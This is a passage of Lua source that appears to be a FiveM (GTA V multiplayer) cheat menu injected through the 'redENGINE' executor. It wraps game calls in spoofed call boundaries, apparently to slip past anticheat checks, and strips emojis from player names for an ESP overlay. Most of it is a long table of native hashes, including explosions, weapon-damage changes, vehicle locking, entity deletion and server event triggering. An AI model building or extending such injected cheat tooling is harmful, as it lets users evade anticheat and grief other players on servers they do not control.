                   local boundary = bid or (boundaryIdx + 1)
                   boundaryIdx = boundaryIdx + 1
                   bfn(boundary, coroutine.running())
       
                   local wrap = function(...)
                       dummyUseBoundary(boundary)
                       local v = table.pack(fn(...))
       
                       return table.unpack(v)
                   end
       
                   local v = table.pack(wrap(...))
                   bfn(boundary, nil)
       
                   return table.unpack(v)
               end
           end
       
           local runWithBoundaryEnd = getBoundaryFunc(dict.Citizen.SubmitBoundaryEnd)
       
           local function lookupify(t)
               local r = {}
       
               for _, v in dict.ipairs(t) do
                   r[v] = true
               end
       
               return r
           end
       
           local blocked_ranges = {{0x0001F601, 0x0001F64F}, {0x00002702, 0x000027B0}, {0x0001F680, 0x0001F6C0}, {0x000024C2, 0x0001F251}, {0x0001F300, 0x0001F5FF}, {0x00002194, 0x00002199}, {0x000023E9, 0x000023F3}, {0x000025FB, 0x000026FD}, {0x0001F300, 0x0001F5FF}, {0x0001F600, 0x0001F636}, {0x0001F681, 0x0001F6C5}, {0x0001F30D, 0x0001F567}, {0x0001F980, 0x0001F984}, {0x0001F910, 0x0001F918}, {0x0001F6E0, 0x0001F6E5}, {0x0001F920, 0x0001F927}, {0x0001F919, 0x0001F91E}, {0x0001F933, 0x0001F93A}, {0x0001F93C, 0x0001F93E}, {0x0001F985, 0x0001F98F}, {0x0001F940, 0x0001F94F}, {0x0001F950, 0x0001F95F}, {0x0001F928, 0x0001F92F}, {0x0001F9D0, 0x0001F9DF}, {0x0001F9E0, 0x0001F9E6}, {0x0001F992, 0x0001F997}, {0x0001F960, 0x0001F96B}, {0x0001F9B0, 0x0001F9B9}, {0x0001F97C, 0x0001F97F}, {0x0001F9F0, 0x0001F9FF}, {0x0001F9E7, 0x0001F9EF}, {0x0001F7E0, 0x0001F7EB}, {0x0001FA90, 0x0001FA95}, {0x0001F9A5, 0x0001F9AA}, {0x0001F9BA, 0x0001F9BF}, {0x0001F9C3, 0x0001F9CA}, {0x0001FA70, 0x0001FA73}}
           local block_singles = lookupify{0x000000A9, 0x000000AE, 0x0000203C, 0x00002049, 0x000020E3, 0x00002122, 0x00002139, 0x000021A9, 0x000021AA, 0x0000231A, 0x0000231B, 0x000025AA, 0x000025AB, 0x000025B6, 0x000025C0, 0x00002934, 0x00002935, 0x00002B05, 0x00002B06, 0x00002B07, 0x00002B1B, 0x00002B1C, 0x00002B50, 0x00002B55, 0x00003030, 0x0000303D, 0x00003297, 0x00003299, 0x0001F004, 0x0001F0CF, 0x0001F6F3, 0x0001F6F4, 0x0001F6E9, 0x0001F6F0, 0x0001F6CE, 0x0001F6CD, 0x0001F6CF, 0x0001F6CB, 0x00023F8, 0x00023F9, 0x00023FA, 0x0000023, 0x0001F51F, 0x0001F6CC, 0x0001F9C0, 0x0001F6EB, 0x0001F6EC, 0x0001F6D0, 0x00023CF, 0x000002A, 0x0002328, 0x0001F5A4, 0x0001F471, 0x0001F64D, 0x0001F64E, 0x0001F645, 0x0001F646, 0x0001F681, 0x0001F64B, 0x0001F647, 0x0001F46E, 0x0001F575, 0x0001F582, 0x0001F477, 0x0001F473, 0x0001F930, 0x0001F486, 0x0001F487, 0x0001F6B6, 0x0001F3C3, 0x0001F57A, 0x0001F46F, 0x0001F3CC, 0x0001F3C4, 0x0001F6A3, 0x0001F3CA, 0x00026F9, 0x0001F3CB, 0x0001F6B5, 0x0001F6B5, 0x0001F468, 0x0001F469, 0x0001F990, 0x0001F991, 0x0001F6F5, 0x0001F6F4, 0x0001F6D1, 0x0001F6F6, 0x0001F6D2, 0x0002640, 0x0002642, 0x0002695, 0x0001F3F3, 0x0001F1FA, 0x0001F91F, 0x0001F932, 0x0001F931, 0x0001F9F8, 0x0001F9F7, 0x0001F3F4, 0x0001F970, 0x0001F973, 0x0001F974, 0x0001F97A, 0x0001F975, 0x0001F976, 0x0001F9B5, 0x0001F9B6, 0x0001F468, 0x0001F469, 0x0001F99D, 0x0001F999, 0x0001F99B, 0x0001F998, 0x0001F9A1, 0x0001F99A, 0x0001F99C, 0x0001F9A2, 0x0001F9A0, 0x0001F99F, 0x0001F96D, 0x0001F96C, 0x0001F96F, 0x0001F9C2, 0x0001F96E, 0x0001F99E, 0x0001F9C1, 0x0001F6F9, 0x0001F94E, 0x0001F94F, 0x0001F94D, 0x0000265F, 0x0000267E, 0x0001F3F4, 0x0001F971, 0x0001F90E, 0x0001F90D, 0x0001F90F, 0x0001F9CF, 0x0001F9CD, 0x0001F9CE, 0x0001F468, 0x0001F469, 0x0001F9D1, 0x0001F91D, 0x0001F46D, 0x0001F46B, 0x0001F46C, 0x0001F9AE, 0x0001F415, 0x0001F6D5, 0x0001F6FA, 0x0001FA82, 0x0001F93F, 0x0001FA80, 0x0001FA81, 0x0001F97B, 0x0001F9AF, 0x0001FA78, 0x0001FA79, 0x0001FA7A}
       
           function ADRVSDD:RemoveEmojis(str)
               local new = ""
       
               for _, codepoint in dict.utf8.codes(str) do
                   local safe = true
       
                   if block_singles[codepoint] then
                       safe = false
                   else
                       for _, range in dict.ipairs(blocked_ranges) do
                           if range[1] <= codepoint and codepoint <= range[2] then
                               safe = false
                               break
                           end
                       end
                   end
       
                   if safe then
                       new = new .. dict.utf8.char(codepoint)
                   end
               end
       
               return new
           end
       
           -- Used to clean player names.
           function ADRVSDD:CleanName(str, is_esp)
               str = str:gsub("~", "")
               str = ADRVSDD:RemoveEmojis(str)
       
               if #str >= 25 and not is_esp then
                   str = str:sub(1, 25) .. "..."
               end
       
               return str
           end
       
           local _natives = {
               ["TriggerEvent"] = {
                   func = function(eventName, ...)
                       if not eventName then return end
                       local payload = msgpack.pack({...})
       
                       return runWithBoundaryEnd(function() return TriggerEventInternal(eventName, payload, payload:len()) end)
                   end
               },
               ["TriggerServerEvent"] = {
                   func = function(eventName, ...)
                       if not eventName then return end
                       local payload = msgpack.pack({...})
       
                       return TriggerServerEventInternal(eventName, payload, payload:len())
                   end
               },
               ["DestroyCam"] = {
                   hash = 0x865908C81A2C22E9
               },
               ["GetCurrentServerEndpoint"] = {
                   hash = 0xEA11BFBA,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ResultAsString()
                   end
               },
               ["GetCurrentResourceName"] = {
                   hash = 0xE5E9EBBB,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ResultAsString()
                   end
               },
               ["GetGameTimer"] = {
                   hash = 0x9CD27B0045628463,
                   unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger() end,
               },
               ["GetActivePlayers"] = {
                   hash = 0xcf143fb9,
                   unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsObject() end,
                   return_as = function(obj) return msgpack.unpack(obj) end
               },
               ["GetVehicleMaxNumberOfPassengers"] = {
                   hash = 0xA7C4F2C6E744A550,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["FindFirstVehicle"] = {
                   hash = 0x15e55694,
                   unpack = function(...)
                       local args = (...)
       
                       return dict.Citizen.PointerValueIntInitialized(args[1]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["FindNextVehicle"] = {
                   hash = 0x8839120d,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.PointerValueIntInitialized(args[2]), dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["EndFindVehicle"] = {
                   hash = 0x9227415a,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1]
                   end
               },
               ["FindFirstPed"] = {
                   hash = 0xfb012961,
                   unpack = function(...)
                       local args = (...)
       
                       return dict.Citizen.PointerValueIntInitialized(args[1]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["FindNextPed"] = {
                   hash = 0xab09b548,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.PointerValueIntInitialized(args[2]), dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["EndFindPed"] = {
                   hash = 0x9615c2ad,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1]
                   end
               },
               ["FindFirstObject"] = {
                   hash = 0xFAA6CB5D,
                   unpack = function(...)
                       local args = (...)
       
                       return dict.Citizen.PointerValueIntInitialized(args[1]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["FindNextObject"] = {
                   hash = 0x4E129DBF,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.PointerValueIntInitialized(args[2]), dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["EndFindObject"] = {
                   hash = 0xDEDA4E50,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1]
                   end
               },
               ["GetPlayerServerId"] = {
                   hash = 0x4d97bcc7,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["GetNumResources"] = {
                   hash = 0x863f27b,
                   unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger() end
               },
               ["GetResourceByFindIndex"] = {
                   hash = 0x387246b7,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsString()
                   end
               },
               ["LoadResourceFile"] = {
                   func = function(...)
                       if _Executor ~= "redENGINE" then return end
                       local args = {...}
       
                       return dict.Citizen.IN(0xEB01A, LoadResourceFile(args[1], args[2]))
                   end
               },
               ["RequestCollisionAtCoord"] = {
                   hash = 0x07503F7948F491A7,
                   unpack = function(...)
                       local args = (...)
                       local x, y, z
       
                       if dict.type(args[1]) == "table" or dict.type(args[1]) == "vector" then
                           x = args[1].x
                           y = args[1].y
                           z = args[1].z
                       else
                           x = args[1]
                           y = args[2]
                           z = args[3]
                       end
       
                       return x, y, z, dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["GetEntityCoords"] = {
                   hash = 0x3FEF770D40960D5A,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector()
                   end
               },
               ["RemoveBlip"] = {
                   hash = 0x86A652570E5F25DD,
                   unpack = function(...)
                       local args = (...)
       
                       return dict.Citizen.PointerValueIntInitialized(args[1])
                   end
               },
               ["GetNuiCursorPosition"] = {
                   hash = 0xbdba226f,
                   unpack = function() return dict.Citizen.PointerValueInt(), dict.Citizen.PointerValueInt() end
               },
               ["DoesEntityExist"] = {
                   hash = 0x7239B21A38F536BA,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["IsEntityDead"] = {
                   hash = 0x5F9532F3B5CC2551,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["IsPedDeadOrDying"] = {
                   hash = 0x3317DEDB88C95038,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["IsPedShooting"] = {
                   hash = 0x34616828CD07F1A1,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["PlaySoundFrontend"] = {
                   hash = 0x67C540AA08E4A6F5,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], args[3], args[4]
                   end
               },
               ["GetPedInVehicleSeat"] = {
                   hash = 0xBB40DD2270B65366,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["HasAnimDictLoaded"] = {
                   hash = 0xD031A9162D01088C,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["CreatePed"] = {
                   hash = 0xD49F9B0955C367DE,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.type(args[2]) == "string" and ADRVSDD:GetFunction("GetHashKey")(args[2]) or args[2], args[3], args[4], args[5], args[6], args[7], args[8], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["CreatePedInsideVehicle"] = {
                   hash = 0x7DD959874C1FD534,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], dict.type(args[3]) == "string" and ADRVSDD:GetFunction("GetHashKey")(args[3]) or args[3], args[4], args[5], args[6], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["NetworkHasControlOfEntity"] = {
                   hash = 0x01BF60A500E28887,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["SimulatePlayerInputGait"] = {
                   hash = 0x477D5D63E63ECA5D
               },
               ["ResetPedRagdollTimer"] = {
                   hash = 0x9FA4664CF62E47E8
               },
               ["IsVehicleDamaged"] = {
                   hash = 0xBCDC5017D3CE1E9E,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["ToggleVehicleMod"] = {
                   hash = 0x2A1F4F37F95BAD08
               },
               ["NetworkGetPlayerIndexFromPed"] = {
                   hash = 0x6C0E2E0125610278,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["ResetPlayerStamina"] = {
                   hash = 0xA6F312FCCE9C1DFE
               },
               ["GetEntityAlpha"] = {
                   hash = 0x5A47B3B5E63E94C6,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["IsEntityVisible"] = {
                   hash = 0x47D6F43D77935C75,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end,
                   return_as = function(int) return int == 1 end
               },
               ["AreAnyVehicleSeatsFree"] = {
                   hash = 0x2D34FC3BC4ADB780,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end,
                   return_as = function(int) return int == 1 end
               },
               ["IsEntityVisibleToScript"] = {
                   hash = 0xD796CB5BA8F20E32,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end,
                   return_as = function(int) return int == 1 end
               },
               ["NetworkExplodeVehicle"] = {
                   hash = 0x301A42153C9AD707
               },
               ["DisplayRadar"] = {
                   hash = 0xA0EBB943C300E693
               },
               ["SetCursorLocation"] = {
                   hash = 0xFC695459D4D0E219
               },
               ["SetPlayerWeaponDamageModifier"] = {
                   hash = 0xCE07B9F7817AADA3
               },
               ["SetPedArmour"] = {
                   hash = 0xCEA04D83135264CC
               },
               ["SetEntityLocallyInvisible"] = {
                   hash = 0xE135A9FF3F5D05D8
               },
               ["SetVehicleDoorsLockedForPlayer"] = {
                   hash = 0x517AAF684BB50CD1
               },
               ["SetVehicleDoorsLockedForAllPlayers"] = {
                   hash = 0xA2F80B8D040727CC
               },
               ["SetVehicleDoorsLocked"] = {
                   hash = 0xB664292EAECF7FA6
               },
               ["SetVehicleTyresCanBurst"] = {
                   hash = 0xEB9DC3C7D8596C46
               },
               ["SetVehicleMod"] = {
                   hash = 0x6AF0636DDEDCB6DD
               },
               ["SetPedCoordsKeepVehicle"] = {
                   hash = 0x9AFEFF481A85AB2E
               },
               ["SetVehicleEnginePowerMultiplier"] = {
                   hash = 0x93A3996368C94158
               },
               ["GetFirstBlipInfoId"] = {
                   hash = 0x1BEDE233E6CD2A1F,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["GetGroundZFor_3dCoord"] = {
                   hash = 0xC906A7DAB05C8D2B,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], args[3], dict.Citizen.PointerValueFloat(), dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["GetBlipInfoIdCoord"] = {
                   hash = 0xFA7C7F0AADF25D09,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector()
                   end
               },
               ["GetNumVehicleMods"] = {
                   hash = 0xE38E9162A2500646,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["SetVehicleModKit"] = {
                   hash = 0x1F2AA07F00B3217A
               },
               ["SetPedToRagdoll"] = {
                   hash = 0xAE99FB955581844A
               },
               ["SetVehicleFixed"] = {
                   hash = 0x115722B1B9C14C1C
               },
               ["SetPedKeepTask"] = {
                   hash = 0x971D38760FBC02EF
               },
               ["NetworkGetNetworkIdFromEntity"] = {
                   hash = 0xA11700682F3AD45C,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["RemoveWeaponFromPed"] = {
                   hash = 0x4899CB088EDF59B8
               },
               ["SetNetworkIdSyncToPlayer"] = {
                   hash = 0xA8A024587329F36A
               },
               ["SetNetworkIdCanMigrate"] = {
                   hash = 0x299EEB23175895FC
               },
               ["DoesCamExist"] = {
                   hash = 0xA7A932170592B50E
               },
               ["CreateCam"] = {
                   hash = 0xC3981DCE61D9E13F
               },
               ["GetGameplayCamRot"] = {
                   hash = 0x837765A25378F0BB,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector()
                   end
               },
               ["GetCamRot"] = {
                   hash = 0x7D304C1C955E3E12,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector()
                   end
               },
               ["StartShapeTestRay"] = {
                   hash = 0x377906D8A31E5586,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], args[3], args[4], args[5], args[6], args[7], args[8], args[9], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["GetShapeTestResult"] = {
                   hash = 0x3D87450E15D98694,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.PointerValueInt(), dict.Citizen.PointerValueVector(), dict.Citizen.PointerValueVector(), dict.Citizen.PointerValueInt(), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end,
                   return_as = function(...)
                       local ret = {...}
       
                       return ret[1], ret[2] == 1, ret[3], ret[4], ret[5]
                   end
               },
               ["AddExplosion"] = {
                   hash = 0xE3AD2BDBAEE269AC
               },
               ["CreateVehicle"] = {
                   hash = 0xAF35D0D2583051B0,
                   unpack = function(...)
                       local args = (...)
       
                       return dict.type(args[1]) == "string" and ADRVSDD:GetFunction("GetHashKey")(args[1]) or args[1], args[2], args[3], args[4], args[5], args[6], args[7], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["SetPedIntoVehicle"] = {
                   hash = 0xF75B0D629E1C063D
               },
               ["SetPedAlertness"] = {
                   hash = 0xDBA71115ED9941A6
               },
               ["TaskVehicleDriveWander"] = {
                   hash = 0x480142959D337D00
               },
               ["CreateObject"] = {
                   hash = 0x509D5878EB39E842,
                   unpack = function(...)
                       local args = (...)
       
                       return dict.type(args[1]) == "string" and ADRVSDD:GetFunction("GetHashKey")(args[1]) or args[1], args[2], args[3], args[4], args[5], args[6], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["DeletePed"] = {
                   hash = 0x9614299DCB53E54B,
                   unpack = function(...)
                       local args = (...)
       
                       return dict.Citizen.PointerValueIntInitialized(args[1])
                   end
               },
               ["DeleteEntity"] = {
                   hash = 0xAE3CBE5BF394C9C9,
                   unpack = function(...)
                       local args = (...)
       
                       return dict.Citizen.PointerValueIntInitialized(args[1])
                   end
               },
               ["DeleteObject"] = {
                   hash = 0x539E0AE3E6634B9F,
                   unpack = function(...)
                       local args = (...)
       
                       return dict.Citizen.PointerValueIntInitialized(args[1])
                   end
               },
               ["DeleteVehicle"] = {
                   hash = 0xEA386986E786A54F,
                   unpack = function(...)
                       local args = (...)
       
                       return dict.Citizen.PointerValueIntInitialized(args[1])
                   end
               },
               ["NetworkRequestControlOfEntity"] = {
                   hash = 0xB69317BF5E782347,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["GetModelDimensions"] = {
                   hash = 0x03E8D3D5F549087A,
                   unpack = function(...)
                       local args = (...)
       
                       return dict.type(args[1]) == "string" and ADRVSDD:GetFunction("GetHashKey")(args[1]) or args[1], dict.Citizen.PointerValueVector(), dict.Citizen.PointerValueVector()
                   end
               },
               ["GetEntityModel"] = {
                   hash = 0x9F47B058362C84B5,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["SetEntityAsMissionEntity"] = {
                   hash = 0xAD738C3085FE7E11
               },
               ["SetEntityRotation"] = {
                   hash = 0x8524A8B0171D5E07
               },
               ["SetEntityLocallyVisible"] = {
                   hash = 0x241E289B5C059EDC
               },
               ["SetEntityAlpha"] = {
                   hash = 0x44A0870B7E92D7C0
               },
               ["SetEntityCollision"] = {
                   hash = 0x1A9205C1B9EE827F
               },
               ["SetEntityCoords"] = {
                   hash = 0x06843DA7060A026B
               },
               ["GivePlayerRagdollControl"] = {
                   hash = 0x3C49C870E66F0A28
               },
               ["GetHashKey"] = {
                   hash = 0xD24D37CC275948CC,
                   unpack = function(...)
                       local args = (...)
       
                       return dict.tostring(args[1]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["GetVehiclePedIsIn"] = {
                   hash = 0x9A9112A0FE9A4713
               },
               ["PlayerPedId"] = {
                   hash = 0xD80958FC74E988A6,
                   unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger() end
               },
               ["GetPlayerPed"] = {
                   hash = 0x43A66C31C68491C0
               },
               ["HasModelLoaded"] = {
                   hash = 0x98A4EB5D89A0C952,
                   unpack = function(...)
                       local args = (...)
       
                       return dict.type(args[1]) == "string" and ADRVSDD:GetFunction("GetHashKey")(args[1]) or args[1], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["SetPedCanRagdoll"] = {
                   hash = 0xB128377056A54E2A
               },
               ["RequestModel"] = {
                   hash = 0x963D27A58DF860AC,
                   unpack = function(...)
                       local args = (...)
       
                       return dict.type(args[1]) == "string" and ADRVSDD:GetFunction("GetHashKey")(args[1]) or args[1]
                   end
               },
               ["SetTextFont"] = {
                   hash = 0x66E0276CC5F6B9DA
               },
               ["SetTextProportional"] = {
                   hash = 0x038C1F517D7FDCF8
               },
               ["HasStreamedTextureDictLoaded"] = {
                   hash = 0x0145F696AAAAD2E4
               },
               ["RequestStreamedTextureDict"] = {
                   hash = 0xDFA2EF8E04127DD5
               },
               ["GetActiveScreenResolution"] = {
                   hash = 0x873C9F3104101DD3,
                   unpack = function() return dict.Citizen.PointerValueInt(), dict.Citizen.PointerValueInt() end
               },
               ["IsDisabledControlJustPressed"] = {
                   hash = 0x91AEF906BCA88877,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["IsDisabledControlJustReleased"] = {
                   hash = 0x305C8DCD79DA8B0F,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["IsDisabledControlPressed"] = {
                   hash = 0xE2587F8CBBD87B1D,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["IsDisabledControlReleased"] = {
                   hash = 0xFB6C4072E9A32E92,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["IsControlJustPressed"] = {
                   hash = 0x580417101DDB492F,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["IsControlJustReleased"] = {
                   hash = 0x50F940259D3841E6,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["IsControlPressed"] = {
                   hash = 0xF3A21BCD95725A4A,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["IsControlReleased"] = {
                   hash = 0x648EE3E7F38877DD,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], dict.Citizen.ReturnResultAnyway()
                   end
               },
               ["ClearPedTasks"] = {
                   hash = 0xE1EF3C1216AFF2CD
               },
               ["ClearPedTasksImmediately"] = {
                   hash = 0xAAA34F8A7CB32098
               },
               ["ClearPedSecondaryTask"] = {
                   hash = 0x176CECF6F920D707
               },
               ["SetEntityProofs"] = {
                   hash = 0xFAEE099C6F890BB8
               },
               ["SetCamActive"] = {
                   hash = 0x026FB97D0A425F84
               },
               ["RenderScriptCams"] = {
                   hash = 0x07E5B515DB0636FC,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], args[3], args[4], args[5]
                   end
               },
               ["GetEntityForwardVector"] = {
                   hash = 0x0A794A5A57F8DF91,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector()
                   end
               },
               ["RequestAnimDict"] = {
                   hash = 0xD3BD40951412FEF6
               },
               ["SetTextScale"] = {
                   hash = 0x07C837F9A01C34C9
               },
               ["SetTextColour"] = {
                   hash = 0xBE6B23FFA53FB442
               },
               ["SetTextDropShadow"] = {
                   hash = 0x465C84BC39F1C351
               },
               ["SetTextEdge"] = {
                   hash = 0x441603240D202FA6
               },
               ["SetTextOutline"] = {
                   hash = 0x2513DFB0FB8400FE
               },
               ["ClearPedBloodDamage"] = {
                   hash = 0x8FE22675A5A45817
               },
               ["SetEntityHealth"] = {
                   hash = 0x6B76DC1F3AE6E6A3
               },
               ["NetworkResurrectLocalPlayer"] = {
                   hash = 0xEA23C49EAA83ACFB
               },
               ["SetTextCentre"] = {
                   hash = 0xC02F4DBFB51D988B
               },
               ["BeginTextCommandDisplayText"] = {
                   hash = 0x25FBB336DF1804CB
               },
               ["BeginTextCommandWidth"] = {
                   hash = 0x54CE8AC98E120CAB
               },
               ["EndTextCommandGetWidth"] = {
                   hash = 0x85F061DA64ED2F67,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ResultAsFloat()
                   end
               },
               ["GetTextScaleHeight"] = {
                   hash = 0xDB88A37483346780,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], dict.Citizen.ResultAsFloat()
                   end
               },
               ["DrawSprite"] = {
                   hash = 0xE7FFAE5EBF23D890
               },
               ["FreezeEntityPosition"] = {
                   hash = 0x428CA6DBD1094446
               },
               ["GetPedBoneIndex"] = {
                   hash = 0x3F428D08BE5AAE31,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["GetPedBoneCoords"] = {
                   hash = 0x17C07FC640E86B4E,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], args[2], args[3], args[4], args[5], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsVector()
                   end
               },
               ["SetPedShootsAtCoord"] = {
                   hash = 0x96A05E4FB321B1BA
               },
               ["GetEntityBoneIndexByName"] = {
                   hash = 0xFB71170B7E76ACBA,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.tostring(args[2]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
                   end
               },
               ["GetOffsetFromEntityInWorldCoords"] = {
                   hash = 0x1899F328B0E12848,
                   unpack = function(...)
                       local args = (...)
                       local x, y, z
       
                       if dict.type(args[2]) == "table" or dict.type(args[2]) == "vector" then
                           x = args[2].x
                           y = args[2].y
                           z = args[2].z
                       else
                           x = args[2]
                           y = args[3]
                           z = args[4]
                       end
       
                       return args[1], x, y, z, dict.Citizen.ResultAsVector()
                   end
               },
               ["AddTextComponentSubstringPlayerName"] = {
                   hash = 0x6C188BE134E074AA
               },
               ["EndTextCommandDisplayText"] = {
                   hash = 0xCD015E5BB0D96A57
               },
               ["IsPedInAnyVehicle"] = {
                   hash = 0x997ABD671D25CA0B
               },
               ["GetEntityHeading"] = {
                   hash = 0xE83D4F9BA2A38914,
                   unpack = function(...)
                       local args = (...)
       
                       return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsFloat()
                   end
               },
               ["AddBlipForCoord"] = {
                   hash = 0x5A039BB0BCA604B6
               },
               ["SetBlipSprite"] = {
                   hash = 0xDF735600A4696DAF
               },
               ["SetBlipColour"] = {
                   hash = 0x03D7FB09E75D6B7E
               },
               ["SetBlipScale"] = {
                   hash = 0xD38744167B2FA257
               },
               ["SetBlipCoords"] = {
                   hash = 0xAE2AF67E9D9AF65D
               },
               ["SetBlipRotation"] = {
                   hash = 0xF87683CDF73C3F6E
               },
               ["ShowHeadingIndicatorOnBlip"] = {
                   hash = 0x5FBCA48327B914DF
               },
               ["SetBlipCategory"] = {
                   hash = 0x234CDD44D996FD9A
               },
               ["BeginTextCommandSetBlipName"] = {
